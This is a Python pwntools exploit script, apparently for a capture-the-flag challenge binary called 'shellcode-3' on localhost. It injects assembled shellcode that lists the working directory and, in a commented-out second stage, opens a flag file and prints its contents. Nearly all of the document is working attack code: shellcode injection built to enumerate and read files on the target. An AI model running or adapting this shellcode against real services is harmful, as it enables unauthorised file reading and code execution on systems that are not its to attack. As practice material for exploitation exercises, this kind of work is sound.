#!/usr/bin/env python3

from pwn import *

elf = ELF("./shellcode-3")

HOST, PORT = "localhost", 5002

context.binary = elf
context.terminal = ["tmux", "splitw", "-h", "-p", "75"]

MAXSIZE = 200

def main():
    global io
    io = conn()

    io.recvuntil("Enter your shellcode : ")

    RWBUF = 0x601800
    COUNT = 0x80
    READSIZE = 0x100

    # first run : get flag name

    shellcode = asm(
        shellcraft.open(".", constants.O_DIRECTORY) +
        shellcraft.getdents('rax', RWBUF, COUNT) +
        shellcraft.write(1, RWBUF, COUNT)
    )
    assert(len(shellcode) <= MAXSIZE)

    io.send(shellcode)
    buf = io.recv(COUNT)
    entries = dirents(buf)
    log.info(f"entries: {entries}")

    # second run : read flag

    # flag = "flag-44da17c5.txt"

    # shellcode = asm(
    #     shellcraft.open(flag, 0) +
    #     shellcraft.read("rax", RWBUF, READSIZE) +
    #     shellcraft.write(1, RWBUF, READSIZE)
    # )
    # assert(len(shellcode) <= MAXSIZE)

    # io.send(shellcode)

    io.interactive()

def conn():
    gdbscript = '''
    '''
    if args.REMOTE:
        p = remote(HOST, PORT)
    elif args.GDB:
        p = gdb.debug(elf.path, gdbscript=gdbscript)
    else:
        p = process(elf.path)

    return p

if __name__ == "__main__":
    io = None
    try:
        main()
    finally:
        if io:
            io.close()
